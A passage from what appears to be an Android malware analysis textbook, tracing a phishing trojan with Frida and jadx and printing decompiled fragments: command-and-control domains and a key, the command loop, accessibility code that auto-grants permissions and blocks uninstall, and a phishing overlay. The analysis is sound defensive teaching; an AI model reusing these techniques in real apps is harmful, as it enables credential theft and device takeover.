<p class="indent">There are two ways to perform a more complete trace. First, it’s possible to change the <span class="literal">frida-trace</span> command so it attaches to an existing process rather than spawning a new process. While easy to do, this would mean missing out on all method calls between the start of the app and Frida attaching to the process. The alternative option is to write a more complex Frida script that waits for the class loader to complete, enumerates all methods, and intercepts them. For our purpose, the scrappy option of attaching to a running process should work fairly well, due to a quirk in the malware. Because the malware blocks most of its functionality from executing until the user grants it permission to use the accessibility API, we simply launch the app, let it sit at the accessibility request window, and attach Frida to the process.</p>&#13;
<p class="indent">To tell <span class="literal">frida-server</span> to attach to a process rather than spawn its own, we can switch the <span class="literal">-f</span> argument to <span class="literal">-p</span> and pass it the process ID instead of the package name. We could also attach to a process by name, but doing so is awkward on Android because Frida expects the app name, not the package name. Usually, during malware analysis, you’ll quickly learn an app’s package name but not its textual name. Here, we attach to <em>com.spike.old</em> through its process ID, 24606:</p>&#13;
<pre>$ <span class="codestrong1">frida-trace -U -j 'com.sniff*!*' -p 24606</span>&#13;
...&#13;
11851 ms  MainActivity.$init()&#13;
<span epub:type="pagebreak" id="page_143"/>11897 ms  MainActivity.onCreate(null)&#13;
11957 ms     | UtilGlobal.isAccessibilityServiceEnabled(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.MainActivity&gt;",&#13;
    "&lt;instance: java.lang.Class&gt;")&#13;
...&#13;
11994 ms     |    | UtilGlobal.startAccessibilityActivity(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.MainActivity&gt;")&#13;
12005 ms     | MainActivity$1.$init(&#13;
    "&lt;instance: com.sniff.sibling.MainActivity&gt;")&#13;
12006 ms     | UtilGlobal.startKingService(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.MainActivity&gt;")&#13;
...&#13;
12122 ms  KingService.onStartCommand(&#13;
    "&lt;instance: android.content.Intent&gt;", 0, 1)&#13;
12123 ms     | UtilGlobal.Log("KingService", "onStartCommand")&#13;
12123 ms     | KingService.startService()&#13;
12123 ms     |    | UtilGlobal.Log("KingService", "startService")&#13;
12125 ms     |    | UtilGlobal.setActualNetworkConnection(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;", 0)&#13;
12126 ms     |    |    | UtilGlobal.SettingsWrite(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;",&#13;
    "ANCT", "simpleyo5.tk")&#13;
12126 ms     |    | ApiClient.create(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;")&#13;
12346 ms     |    |    | UtilGlobal.getActualNetworkConnection(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;")&#13;
12347 ms     |    |    |    | UtilGlobal.SettingsRead(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;", "ANCT")&#13;
12348 ms     |    |    |    | &lt;= "simpleyo5.tk"&#13;
...&#13;
12530 ms     |    | ApiVerifyController.sendRequest(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;")&#13;
12530 ms     |    |    | UtilGlobal.getAndroidIDBytes(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;")&#13;
12531 ms     |    |    |    | UtilGlobal.getAndroidID(&#13;
    "&lt;instance: android.content.Context,&#13;
    $className: com.sniff.sibling.Services.KingService&gt;")&#13;
<span epub:type="pagebreak" id="page_144"/>12534 ms     |    |    |    | &lt;= "f67fecc6233d8ae9"&#13;
12535 ms     |    |    |    | UtilEncryption.hexStringToBytes(&#13;
    "f67fecc6233d8ae9")</pre>&#13;
<p class="indent">We’ve shortened the output significantly for this book. In practice, this script generates hundreds of lines per second. Even this partial log, of 700 ms of activity, shows a wealth of information. We see more class and package names in <em>com.sniff</em> , as well as how the malware reads the command-and-control URL from the <em>ring0.xml</em> configuration file and uses encryption. All of this is tied together by the mysterious <span class="literal">KingService</span> class.</p>&#13;
<p class="indent">In most cases, malware doesn’t come with an execution block mechanism like this sample’s accessibility request window. In these cases, you really may miss out on important method calls that happen before <span class="literal">frida-trace</span> attaches to the target process. You can find examples of custom scripts on the internet, including some library code to make the whole process very simple.</p>&#13;
<h4 class="h4" id="ch04lev1sec23"><strong><em>Accessibility Abuse</em></strong></h4>&#13;
<p class="noindent">We mentioned that the very first thing the app asks users to do is to grant it permission to use the accessibility API. Why it desires this permission is still unclear, so let’s dig deeper to find out. For this task, we can once again use <span class="literal">frida-trace</span> to cast a wide net, logging all uses of the accessibility API by the app:</p>&#13;
<pre>$ <span class="codestrong1">frida-trace -U -j 'android.view.accessibility.*!*' -f com.spike.old &gt; accessibility_log.txt</span></pre>&#13;
<p class="indent">After manually granting the app access to the accessibility API in the emulator, the <span class="literal">frida-trace</span> command creates several megabytes of output. In the emulator, however, you won’t see much apart from the home screen and two permission dialogs, for reading SMS messages and making phone calls, which pop up and then disappear. Presumably, the app grants itself these permissions by simulating a user clicking the dialogs’ buttons.</p>&#13;
<p class="indent">Slogging through megabytes of accessibility API usage logs is a chore. We can start by looking for certain patterns, though. When inspecting call traces in Frida earlier in this chapter, we identified <em>com.sniff.sibling</em> as a potentially interesting Java package in the malware. Grepping through the logfile reveals two interesting Java classes:</p>&#13;
<pre>$ <span class="codestrong1">grep -oe "com.sniff.sibling.[a-zA-Z0-9_.]*" accessibility_log.txt | sort | uniq</span>&#13;
com.sniff.sibling.Activities.AccessibilityEnableHintActivity&#13;
com.sniff.sibling.Activities.PermissionActivity</pre>&#13;
<p class="indent">The <span class="literal">PermissionActivity</span> class could be the activity responsible for clicking the buttons in the SMS and call permission dialogs, while <span class="literal">Accessibility EnableHintActivity</span> could be the permission showing the window that asks the user to grant accessibility permission.</p>&#13;
<p class="indent">Another way to look at the logfile is to try to understand which classes in the accessibility API the app uses. The answer, it turns out, is a lot. The <span epub:type="pagebreak" id="page_145"/>following Linux shell command returns about 50 different classes, creating a much more complicated situation than our earlier experiment with intercepting cryptography APIs:</p>&#13;
<pre>$ <span class="codestrong1">grep -oe "android.view.accessibility.[a-zA-Z0-9_.]*" accessibility_log.txt | sort | uniq</span></pre>&#13;
<p class="indent">Without an idea of what to look for next, this method of exploration may lead to a dead end. We’ve reached a point at which pure dynamic analysis becomes too cumbersome, and a mixed-mode exploration of the program, with the help of static analysis, may be in order.</p>&#13;
<h3 class="h3" id="ch04lev11"><strong>Adding Static Analysis</strong></h3>&#13;
<p class="noindent">Now that we’ve instrumented, observed, and manipulated the sample in so many different ways, we have dozens of leads we could pursue to dive deeper into the app. Unfortunately, our leads don’t suggest any easy ways to trigger specific code and behavior. Instead, we must look at the source code, bolstering our dynamic analysis with static techniques.</p>&#13;
<h4 class="h4" id="ch04lev1sec24"><strong><em>Other Command-and-Control Servers</em></strong></h4>&#13;
<p class="noindent">The first piece of analysis we can complete involves the command-and-control server. With dynamic analysis, we found a domain, <em>simpleyo5.tk</em>, with two endpoints, <em>/ping</em> and <em>/metrics</em>. A search for this domain in jadx reveals a single line. The code and its surrounding lines, from <em>com.sniff.sibling.Constants</em>, is shown in <a href="ch04.xhtml#ch4lis16">Listing 4-16</a>.</p>&#13;
<pre>testKey = UtilEncryption.hexStringToBytes("5f9e4a92b1d8c8b98db9b7f8f8800d2e");&#13;
apis = Arrays.asList("simpleyo5.tk", "simpleyo5.cf", "kart12sec.ga", "kart12sec.gq");</pre>&#13;
<p class="list" id="ch4lis16"><em>Listing 4-16: Domain names and encryption key inside</em> com.spike.old</p>&#13;
<p class="indent">Apparently, the malware can switch between up to four command-and-control domains for its commands. The communications encryption key we previously discovered is defined in the line right above the server array initialization.</p>&#13;
<p class="indent">Very often in malware analysis, you’ll find interesting pieces of functionality located close together in the code. For example, take a look at the strings from the <em>com.sniff.sibling.Constants</em> file shown in <a href="ch04.xhtml#ch4lis17">Listing 4-17</a>.</p>&#13;
<pre>public static final String actualNetworkConnectionTag = "ANCT";&#13;
public static final String apiLocationOperation = "metrics";&#13;
public static final String apiLocationVerify = "ping";&#13;
...&#13;
public static final String appCodename = "pioneer_bridge_over_white_rabbits";&#13;
public static final String appInjectTableTag = "AITT";&#13;
...&#13;
public static final String appInjectsEnabledTag = "AIEN";&#13;
...&#13;
public static final String appTag = "cleaner0902";&#13;
<span epub:type="pagebreak" id="page_146"/>...&#13;
public static final String networkStateTag = "NSTG";</pre>&#13;
<p class="list" id="ch4lis17"><em>Listing 4-17: Other interesting strings found in</em> com.sniff.sibling.Constants</p>&#13;
<p class="indent">You should recognize these strings from our earlier analysis stages. In particular, the strings with the four capital letters were the XML tag names from the mysterious <em>ring0.xml</em> configuration file. We can see that these tag names aren’t just random characters but abbreviations that indicate their function. Dynamic analysis alone couldn’t have uncovered that. Likewise, the presence of only two strings starting with <span class="literal">api*</span> provides some evidence that <em>/ping</em> and <em>/metrics</em> are the only endpoints supported by the malware’s command-and-control servers.</p>&#13;
<p class="indent">One other piece of code in <em>com.sniff.sibling.Constants</em> is particularly interesting. In the static initializer, close to the initialization of the command-and-control server array, are statements that hint at which permissions the malware uses. <a href="ch04.xhtml#ch4lis18">Listing 4-18</a> shows this.</p>&#13;
<pre>String[] strArr = new String[10];&#13;
strArr[0] = "android.permission.READ_SMS";&#13;
strArr[1] = "android.permission.RECEIVE_SMS";&#13;
strArr[2] = "android.permission.WAKE_LOCK";&#13;
strArr[3] = "android.permission.RECEIVE_BOOT_COMPLETED";&#13;
strArr[4] = "android.permission.ACCESS_NETWORK_STATE";&#13;
strArr[5] = "android.permission.INTERNET";&#13;
strArr[6] = "android.permission.READ_PHONE_STATE";&#13;
String str = null;&#13;
strArr[7] = Build.VERSION.SDK_INT &gt; 28 ? &#13;
    "android.permission.USE_FULL_SCREEN_INTENT" : null;&#13;
strArr[8] = Build.VERSION.SDK_INT &gt; 28 ?&#13;
    "android.permission.FOREGROUND_SERVICE" : null;&#13;
if (Build.VERSION.SDK_INT &gt; 28) {&#13;
    str = "android.permission.READ_PHONE_NUMBERS";&#13;
}&#13;
strArr[9] = str;&#13;
permissions = strArr;</pre>&#13;
<p class="list" id="ch4lis18"><em>Listing 4-18: Permission strings in</em> com.sniff.sibling.Constants</p>&#13;
<p class="indent">Even with the caveats about permissions described in <a href="ch03.xhtml">Chapter 3</a>, this list gives us more information about the malware’s capabilities.</p>&#13;
<h4 class="h4" id="ch04lev1sec25"><strong><em>Other Server Commands</em></strong></h4>&#13;
<p class="noindent">Our analysis of <em>com.sniff.sibling.Constants</em> revealed all of the malware’s command-and-control servers and their URLs, but we still don’t have the full list of commands the app is capable of executing. This illustrates yet another problem of pure dynamic analysis: if the server doesn’t instruct the malware to execute certain commands while under observation, the dynamic analysis environment will never learn about them.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_147"/>We know that the <em>/metrics</em> URL supports at least two commands: <span class="literal">inj_update</span> and <span class="literal">get_coms</span>. To find other potential commands, we can search for the ones we know about and hope that the others are defined nearby. A search for these two command strings shows that they appear at four locations in the code, three of which are quite interesting.</p>&#13;
<p class="indent">We first find <span class="literal">inj_update</span> referenced inside <em>com.sniff.sibling.Api.Controllers.ApiOperationsController</em>. Shown in <a href="ch04.xhtml#ch4lis19">Listing 4-19</a>, the code using this string is helpfully called <span class="literal">parsePayload</span>.</p>&#13;
<pre>public void parsePayload(byte[] bArr) {&#13;
    char c;&#13;
    String str = new String(bArr, StandardCharsets.UTF_8);&#13;
    UtilGlobal.Log("parsePayload", "&lt;&lt;&lt; " + str);&#13;
    String str2 = ApiSimpleMetricsPayload.fromJson(str).type;&#13;
    int hashCode = str2.hashCode();&#13;
    if (hashCode == 748954943) {&#13;
        if (str2.equals("notif_ic_update")) {&#13;
            c = 2;&#13;
        }&#13;
        c = 65535;&#13;
    } else if (hashCode != 1513349731) {&#13;
        if (hashCode == 1976172123 &amp;&amp; str2.equals("get_coms")) {&#13;
            c = 0;&#13;
        }&#13;
        c = 65535;&#13;
    } else {&#13;
        if (str2.equals("inj_update")) {&#13;
            c = 1;&#13;
        }&#13;
        c = 65535;&#13;
    }&#13;
    if (c == 0) {&#13;
        ApiGetCommandsResponsePayload.fromJson(str).execute(&#13;
            this.contextWeakReference.get());&#13;
    } else if (c == 1) {&#13;
        ApiInjectionUpdateResponsePayload.fromJson(str).execute(&#13;
            this.contextWeakReference.get());&#13;
    }&#13;
}</pre>&#13;
<p class="list" id="ch4lis19"><em>Listing 4-19: Code in</em> <span class="codeitalic1">parsePayload</span> <em>confirms the existence of three commands.</em></p>&#13;
<p class="indent">The code is unnecessarily complex, as all it does is parse the previously decrypted response from the server to understand whether the retrieved JSON object has a <span class="literal">type</span> tag with a value of <span class="literal">notif_ic_update</span>, <span class="literal">get_coms</span>, or <span class="literal">inj_update</span>. We haven’t yet encountered <span class="literal">notif_ic_update</span>, but it appears to be unused, as no branch in the final <span class="literal">if</span> statement is associated with this command. Maybe that’s why we didn’t observe it being sent from the server.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_148"/>These strings appear again inside the mysterious <span class="literal">KingService</span> class we’ve seen several times during our analysis. Shown in <a href="ch04.xhtml#ch4lis20">Listing 4-20</a>, the function that uses them seems to be the malware’s main execution loop. Every step of the malware is outlined there and matches what we observed using logcat and Frida.</p>&#13;
<pre>public /* synthetic */ void m13xbc1baa29(Handler handler) {&#13;
    ...&#13;
    if (!UtilGlobal.isInternetConnected(this)) {&#13;
        UtilGlobal.Log(TAG, "Network disconnected");&#13;
    } else if (UtilGlobal.isNetworkBusy(this) != 0) {&#13;
        UtilGlobal.Log(TAG, "Network busy, dropping one step");&#13;
        UtilGlobal.flagNetworkAsBusy(&#13;
            this, UtilGlobal.isNetworkBusy(this) - 1);&#13;
    } else if (!UtilGlobal.checkClientVerification(this) || &#13;
            UtilGlobal.clientVerificationExpired(this, 300000L)) {&#13;
        UtilGlobal.Log(TAG, "Client is not verified. Verifying... ");&#13;
        new ApiVerifyController().sendRequest(this);&#13;
        UtilGlobal.flagNetworkAsBusy(this, 5);&#13;
    } else if (UtilGlobal.SettingsRead(&#13;
            this, Constants.appInjectTableTag).isEmpty()) {&#13;
        apiOperationController.sendRequest(&#13;
            this, new ApiSimpleMetricsPayload("inj_update"));&#13;
        UtilGlobal.enableInjections(this);&#13;
    } else {&#13;
        apiOperationController.sendRequest(&#13;
            this, new ApiOperationRequestPayload(this, "get_coms"));&#13;
    }&#13;
    if (UtilGlobal.checkClientVerification(this)) {&#13;
        if (!UtilGlobal.checkPermissions(this)) {&#13;
            UtilGlobal.Log(TAG, "Permissions revoked!");&#13;
        } else if (!UtilGlobal.isNotificationServiceEnabled(this)) {&#13;
            UtilGlobal.grantNotificationListenerAccess(this);&#13;
            UtilGlobal.millisecondsSleep(15000);&#13;
        } else if (!UtilGlobal.isIgnoringBatteryOptimizations(this)) {&#13;
            UtilGlobal.startDozeMode(this);&#13;
        }&#13;
    }&#13;
    UtilGlobal.millisecondsSleep(15000);&#13;
}</pre>&#13;
<p class="list" id="ch4lis20"><em>Listing 4-20: The malware’s main execution loop, found in the</em> <span class="codeitalic1">KingService</span> <em>class</em></p>&#13;
<p class="indent">The code straightforwardly shows that the malware first tries to connect to the internet and bails if no network is available. Then it checks whether the network is busy—that is, whether any other server command is in progress. It also checks the following: whether the client is verified and, if so, that the verification has not yet expired; whether it’s time to send the <span class="literal">inj_update</span> command to the server; whether it’s time to send the <span class="literal">get_coms</span> command to the <span epub:type="pagebreak" id="page_149"/>server; whether necessary permissions have been granted; and whether the malware was granted notification access. Finally, it starts <em>doze mode</em>, a setting related to battery optimization.</p>&#13;
<p class="indent">Based on this main execution loop, we can confirm that our dynamic analysis was fairly complete. We uncovered all of these execution options, except for the one related to doze mode. Code inspection will show that entering doze mode is an attempt by the malware to exclude itself from system-wide optimization features that might kill the malware process to preserve battery life.</p>&#13;
<p class="indent">The third interesting piece of code that references the string <span class="literal">inj_update</span> is in the <em>com.sniff.sibling.Api.TDP.ApiGetCommandsResponsePayload</em> class, which contains code to further parse the <span class="literal">get_coms</span> server response. Shortened for brevity, its beginning is shown in <a href="ch04.xhtml#ch4lis21">Listing 4-21</a>.</p>&#13;
<pre>String[] strArr = this.commands;&#13;
int length = strArr.length;&#13;
for (int i = 0; i &lt; length; i++) {&#13;
    String str = strArr[i];&#13;
    UtilGlobal.Log("ApiGetCommandsResponsePayload", str);&#13;
    strArr = strArr;&#13;
    switch (str.hashCode()) {&#13;
        case -2081539234:&#13;
            if (str.equals("sms_log")) {&#13;
                c = 11;&#13;
                break;&#13;
            }&#13;
            c = 65535;&#13;
            break;&#13;
        case -1691298703:&#13;
            if (str.equals("self_kill")) {&#13;
                c = 17;&#13;
                break;&#13;
            }&#13;
            c = 65535;&#13;
            break;&#13;
        case -646462158:&#13;
            if (str.equals("notif_ic_disable")) {&#13;
        ...</pre>&#13;
<p class="list" id="ch4lis21"><em>Listing 4-21: Code that reveals additional server commands</em></p>&#13;
<p class="indent">This code goes through all the commands received from the command-and-control server and executes the functionality for each (omitted here). We can now see that the malware understands the following commands:</p>&#13;
<div class="bqparan">&#13;
<p class="noindentin"><span class="codestrong1">app_list</span> Uploads information about installed apps to the server</p>&#13;
<p class="noindentin"><span class="codestrong1">sms_log</span> Uploads all SMS from the device to the server</p>&#13;
<p class="noindentin"><span class="codestrong1">notif_ic_enable</span> Starts intercepting notifications on the device</p>&#13;
<p class="noindentin"><span epub:type="pagebreak" id="page_150"/><span class="codestrong1">notif_ic_disable</span> Stops intercepting notifications on the device</p>&#13;
<p class="noindentin"><span class="codestrong1">sms_ic_enable</span> Starts intercepting SMS</p>&#13;
<p class="noindentin"><span class="codestrong1">sms_ic_disable</span> Stops intercepting SMS</p>&#13;
<p class="noindentin"><span class="codestrong1">inj_enable</span> Enables phishing overlay windows</p>&#13;
<p class="noindentin"><span class="codestrong1">inj_disable</span> Disables phishing overlay windows</p>&#13;
<p class="noindentin"><span class="codestrong1">inj_update</span> Asks the server for new phishing windows</p>&#13;
</div>&#13;
<p class="indent">Besides these commands, the malware also looks for many commands that aren’t backed by any code. This indicates that the malware is under heavy development and may add more functionality in the future. The unimplemented commands are <span class="literal">self_kill</span>, <span class="literal">fg_disable</span>, <span class="literal">inj_list</span>, <span class="literal">self_cleanup</span>, <span class="literal">notif_ic_update</span>, <span class="literal">fg_enable</span>, <span class="literal">app_kill</span>, <span class="literal">sms_ic_update</span>, <span class="literal">sms_ic_list</span>, and <span class="literal">notif_ic_list</span>. We can only guess their purposes from their names.</p>&#13;
<p class="indent">Now we know everything about the command-and-control servers: their domains, URLs, and commands. We also know the data that the malware collects and which commands are actually implemented. This gives us a very good overview of its capabilities, proving once again that understanding the malware’s command handler is key to understanding its functionality.</p>&#13;
<h4 class="h4" id="ch04lev1sec26"><strong><em>More Accessibility Abuse</em></strong></h4>&#13;
<p class="noindent">One of the remaining mysteries about this malware sample concerns its use of the accessibility API. We’ve already discovered that the malware actively pushes the user to grant it access to this API, and that once this is done the malware makes extensive use of its classes and methods. However, we don’t yet know exactly what it uses the API for.</p>&#13;
<p class="indent">Code that uses the accessibility API isn’t easy to understand. The API is complex and messy, and achieving anything with it takes a lot of code. Because it comprises more than 1,000 lines, showing and explaining all of the malware’s accessibility API functionality is out of this book’s scope. Instead, we’ll limit ourselves to a few highlights.</p>&#13;
<p class="indent">Most of this code is in <em>com.sniff.sibling.Accessibility</em>, a package that contains nearly 20 classes, primarily for simulating real user clicks on predefined apps. For example, the malware can make itself the default SMS handling app by clicking through a series of system settings. Likewise, it has defense mechanisms that check whether the user has opened system dialogs for removing or disabling the malware and close these dialogs if necessary, before the user can complete the removal process.</p>&#13;
<p class="indent">The central part of the accessibility abuse code is the <em>com.sniff.sibling.Services.FitnessAccessibilityService</em> class, which extends the default Android class <em>android.accessibilityservice.AccessibilityService</em> and provides callback methods invoked for accessibility events happening on the system. The most interesting method in this service, <span class="literal">windowStateChangedEvent</span>, handles apps coming to the foreground or otherwise changing state. When this happens, the malware checks which app has come to the foreground and takes the appropriate action. If it finds a phishing target, for example, it shows the phishing <span epub:type="pagebreak" id="page_151"/>dialog. If it instead finds a permission dialog, it clicks a button to grant the app that permission. <a href="ch04.xhtml#ch4lis22">Listing 4-22</a> shows a slice of the <span class="literal">windowStateChangedEvent</span> method.</p>&#13;
<pre>public void windowStateChangedEvent(AccessibilityEvent accessibilityEvent) {&#13;
    if (accessibilityEvent.getPackageName() != null) {&#13;
        if (UtilGlobal.injectionsEnabled(this) &amp;&amp; UtilGlobal.packageHasInjection(&#13;
                this, accessibilityEvent.getPackageName().toString())) {&#13;
            Intent intent = new Intent(this, OverlayInjectActivity.class);&#13;
            intent.addFlags(268435456);&#13;
            intent.addFlags(8388608);&#13;
            UtilGlobal.SettingsWrite(this, Constants.appInjectTag, &#13;
                accessibilityEvent.getPackageName().toString());&#13;
            startActivity(intent);&#13;
        } else if (UtilAccessibility.getEventClassName(accessibilityEvent).equals(&#13;
                "com.miui.home.launcher.uninstall.deletedialog")) {&#13;
            UtilAccessibility.goBack(this, 2);&#13;
        } else if (UtilAccessibility.getEventClassName(accessibilityEvent).equals(&#13;
                "com.android.packageinstaller.uninstalleractivity")) {&#13;
            UtilAccessibility.goBack(this, 2);&#13;
        } else if (accessibilityEvent.getPackageName().equals(&#13;
                "com.google.android.packageinstaller")) {&#13;
            UtilAccessibility.goBack(this, 2);&#13;
        }&#13;
        ...&#13;
        this.modulesManager.performAllNecessary(this, accessibilityEvent);&#13;
        if (UtilAccessibility.checkPermissionsClick(this, accessibilityEvent)) {&#13;
            UtilGlobal.Log("windowStateChangedEvent", "grantPermissionsClick called");&#13;
            UtilAccessibility.grantPermissionsClick(this, accessibilityEvent);&#13;
        }&#13;
        DozeModeAccessibilityModule.performIfNecessary(...);&#13;
        XiaomiDozeModeAccessibilityModule.performIfNecessary(...);&#13;
        DisablePreventionAccessibilityModule.performIfNecessary(...);&#13;
        DefaultSmsAppAccessibilityModule.performIfNecessary(...);&#13;
    DeletionPreventionAccessibilityModule.performIfNecessary(...);&#13;
        XiaomiSpecialPermissionInterceptActivityModule.performIfNecessary(...);&#13;
        ...&#13;
    }&#13;
}</pre>&#13;
<p class="list" id="ch4lis22"><em>Listing 4-22: The accessibility API is used to handle new apps coming to the foreground.</em></p>&#13;
<p class="indent">First, the malware checks whether it should inject phishing dialogs (<span class="literal">injectionsEnabled</span>) and target the active app with such a dialog (<span class="literal">packageHas Injection</span>). If so, the phishing dialog is shown. The next few <span class="literal">if</span> statements are self-defense mechanisms that simulate clicks on the back button when the user opens system dialogs to remove the malware. Following that is the code that accepts all permission requests for the app and takes some system dialog–specific actions.</p>&#13;
<h4 class="h4" id="ch04lev1sec27"><span epub:type="pagebreak" id="page_152"/><strong><em>Automatically Granting Permissions</em></strong></h4>&#13;
<p class="noindent">The service also handles generic accessibility events and events that invoke <span class="literal">windowContentChanged</span> and <span class="literal">notificationStateChanged</span>. The code in these sections is messy and hard to follow. For example, take a look at the code to perform the seemingly simple action of clicking the OK button on a permission dialog to automatically grant the malware all permissions it requests. <a href="ch04.xhtml#ch4lis23">Listing 4-23</a> shows the code for <span class="literal">checkPermissionsClick</span>.</p>&#13;
<pre>public static boolean checkPermissionsClick(&#13;
        AccessibilityService accessibilityService,&#13;
        AccessibilityEvent accessibilityEvent) {&#13;
    return (&#13;
        accessibilityEvent.getPackageName().toString().contains("permissioncontroller") || &#13;
        accessibilityEvent.getPackageName().toString().equals("packageinstaller")&#13;
        ) &amp;&amp; (&#13;
        findFirstNodeByName(accessibilityEvent.getSource(), Constants.appName) != null)&#13;
        &amp;&amp; !UtilGlobal.checkPermissions(accessibilityService);&#13;
}</pre>&#13;
<p class="list" id="ch4lis23"><em>Listing 4-23: Simulating a click on the permission dialog if necessary</em></p>&#13;
<p class="indent">The app first checks whether the accessibility event came from <span class="literal">permission controller</span> or <span class="literal">packageinstaller</span>, to make sure the app is showing the desired dialog. Then it checks whether its app name is part of the hierarchy that led to the accessibility event. We’ve omitted the 20 lines of code for doing so here. Finally, the malware makes sure that it hasn’t yet been granted the relevant permission. If it already has all the permissions it requires, the dialog likely was launched by a different app.</p>&#13;
<p class="indent">After confirming all of these conditions, the malware clicks the dialog’s OK button. <a href="ch04.xhtml#ch4lis24">Listing 4-24</a> shows the first method for accomplishing this click.</p>&#13;
<pre>public static boolean grantPermissionsClick(&#13;
        AccessibilityService accessibilityService,&#13;
        AccessibilityEvent accessibilityEvent) {&#13;
    try {&#13;
        return pressAllowButton(accessibilityEvent.getSource());&#13;
    } catch (Exception unused) {&#13;
        return false;&#13;
    }&#13;
}</pre>&#13;
<p class="list" id="ch4lis24"><em>Listing 4-24: The outer method for clicking the permission dialog button</em></p>&#13;
<p class="indent">This method simply invokes <span class="literal">pressAllowButton</span>, shown in <a href="ch04.xhtml#ch4lis25">Listing 4-25</a>. Here, things become more complicated, as the method iterates over lists of button IDs and button labels. The button label list contains the strings <span class="literal">Allow</span> and <span class="literal">OK</span>, meaning this code will actually fail to locate the buttons if the device <span epub:type="pagebreak" id="page_153"/>doesn’t use these terms due to its language setting. The button ID list contains five strings of the form <span class="literal">com.android.packageinstaller:id/permission_allow_button</span>, which are presumably the IDs for the permission dialog in different Android versions.</p>&#13;
<pre>public static boolean pressAllowButton(&#13;
        AccessibilityNodeInfo accessibilityNodeInfo) {&#13;
    boolean z = false;&#13;
    for (String str : Constants.allowButtonsIdList) {&#13;
        z |= pressButtonByViewId(accessibilityNodeInfo, str);&#13;
    }&#13;
    if (!z) {&#13;
        for (String str2 : Constants.allowButtonsLabelList) {&#13;
            z |= pressButtonByText(accessibilityNodeInfo, str2);&#13;
        }&#13;
    }&#13;
    UtilGlobal.Log(TAG, "IsPressAllowSuccessful: " + z);&#13;
    return z;&#13;
}</pre>&#13;
<p class="list" id="ch4lis25"><em>Listing 4-25: Locating the permission dialog button</em></p>&#13;
<p class="indent">To press a button based on its text label, the malware must first retrieve the text of all buttons in the active dialog. If one of these buttons matches the expected text, it can perform a click, as shown in <a href="ch04.xhtml#ch4lis26">Listing 4-26</a>.</p>&#13;
<pre>public static boolean pressButtonByText(&#13;
        AccessibilityNodeInfo accessibilityNodeInfo, String str) {&#13;
    if (accessibilityNodeInfo == null) {&#13;
        return false;&#13;
    }&#13;
    while (true) {&#13;
        boolean z = false;&#13;
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : &#13;
                accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) {&#13;
            if (accessibilityNodeInfo2.isClickable()) {&#13;
                if (z || clickButton(accessibilityNodeInfo2)) {&#13;
                    z = true;&#13;
                }&#13;
            }&#13;
        }&#13;
        return z;&#13;
    }&#13;
}</pre>&#13;
<p class="list" id="ch4lis26"><em>Listing 4-26: Clicking the permission dialog button</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_154"/>A separate, nearly identical method identifies the button to click based on its ID rather than its label text. The only difference is that it uses the <span class="literal">findAccessibilityNodeInfosByViewId</span> method instead of <span class="literal">findAccessibilityNodeInfosByText</span>. The one remaining method, <span class="literal">clickButton</span>, is shown in <a href="ch04.xhtml#ch4lis27">Listing 4-27</a>; it uses the accessibility API <span class="literal">performAction</span> to execute the click.</p>&#13;
<pre>public static boolean clickButton(&#13;
        AccessibilityNodeInfo accessibilityNodeInfo) {&#13;
    if (accessibilityNodeInfo == null) {&#13;
        return false;&#13;
    }&#13;
    return accessibilityNodeInfo.performAction(16);&#13;
}</pre>&#13;
<p class="list" id="ch4lis27"><em>Listing 4-27: Clicking a button with the accessibility API</em></p>&#13;
<p class="indent">As you can see, even a simple workflow like clicking the OK button in a permission dialog takes so much code that it’s no wonder more advanced manipulation of the system and its dialogs take more than 1,000 lines. Following this code requires knowledge of Android internals and modifications made by device manufacturers.</p>&#13;
<h4 class="h4" id="ch04lev1sec28"><strong><em>Injecting Phishing Windows</em></strong></h4>&#13;
<p class="noindent">Let’s discuss how the malware fulfills its ultimate purpose: phishing. Conceptually, phishing for credentials involves displaying a phishing window, hoping that the victim falls for the ruse, and then sending the stolen credentials to a remote server for future use. This app follows this textbook behavior.</p>&#13;
<p class="indent">We’ve already discovered information about the phishing process. From the accessibility API code, we learned that the app displays the phishing window when a target app becomes active. When analyzing communications with the command-and-control server, we learned where the target app configuration comes from and what the phishing windows look like. The only thing we don’t yet understand is how the app displays the phishing window and steals the credentials.</p>&#13;
<p class="indent">A class called <span class="literal">OverlayInjectActivity</span> is responsible for showing the phishing dialog, collecting user credentials, and sending them to the command-and-control server (<a href="ch04.xhtml#ch4lis28">Listing 4-28</a>).</p>&#13;
<pre>@Override // android.app.Activity&#13;
protected void onStart() {&#13;
    super.onStart();&#13;
    this.context = this;&#13;
    OverlayInjectResource packageInjection = UtilGlobal.getPackageInjection(&#13;
        this, UtilGlobal.SettingsRead(this, Constants.appInjectTag));&#13;
    this.resource = packageInjection;&#13;
    this.hideStop = true;&#13;
    if (!this.stopActivity &amp;&amp; packageInjection != null) {&#13;
        <span epub:type="pagebreak" id="page_155"/>try {&#13;
            WebView webView = new WebView(this);&#13;
            this.wv = webView;&#13;
            webView.getSettings().setJavaScriptEnabled(true);&#13;
            this.wv.setScrollBarStyle(0);&#13;
            this.wv.setWebViewClient(new MyWebViewClient());&#13;
            this.wv.setWebChromeClient(new MyWebChromeClient());&#13;
            this.wv.addJavascriptInterface(new WebAppInterface(this), &#13;
                "Android");&#13;
            this.wv.loadDataWithBaseURL(null, &#13;
                this.resource.getPageResource(this),&#13;
                    "text/html", "UTF-8", null);&#13;
            setContentView(this.wv);&#13;
        } catch (Exception e) {&#13;
            e.printStackTrace();&#13;
        }&#13;
    }&#13;
}</pre>&#13;
